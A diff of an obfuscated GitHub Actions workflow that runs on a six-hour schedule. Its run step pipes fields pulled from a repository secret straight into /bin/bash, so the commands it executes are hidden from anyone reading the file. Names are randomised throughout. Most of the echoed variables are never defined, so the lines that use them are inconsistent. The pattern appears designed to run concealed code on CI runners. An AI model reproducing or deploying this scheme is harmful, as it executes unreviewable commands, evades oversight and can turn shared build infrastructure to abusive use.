@@ -1,20 +1,28 @@
 name: baifeili4312
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
+    - cron: '7 2/6 * * *'
 
-jobs:  # 13084
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: baifeili4312
         env:
-          kut49717: ${{ secrets.kut49717 }}
+          lsjjh1: ${{ secrets.lsjjh1 }}
         run: |
-          echo $kut49717 | jq -r .wsyoz1442 | /bin/bash
-          echo $du9114 | jq -r .lfiv71 | /bin/bash
-          echo $yzmh7 | jq -r .lfgl99113 | /bin/bash
+          echo $lsjjh1 | jq -r .fjgk34 | /bin/bash
+          echo $ctpo15994 | jq -r .a3081 | /bin/bash
+          echo $qu97 | jq -r .rjpvs7 | /bin/bash
+          echo $e4402 | jq -r .lqz25 | /bin/bash
+          echo $utwy6259 | jq -r .gfkv13 | /bin/bash
+          echo $d9 | jq -r .agw222 | /bin/bash
+          echo $pmjo96 | jq -r .nhy68112 | /bin/bash
+          echo $lcqs71 | jq -r .jyxz6075 | /bin/bash
+          echo $yb625 | jq -r .jc143 | /bin/bash
+          echo $jcobg161 | jq -r .fv8976 | /bin/bash
+          echo $aleb5857 | jq -r .hp647 | /bin/bash
 
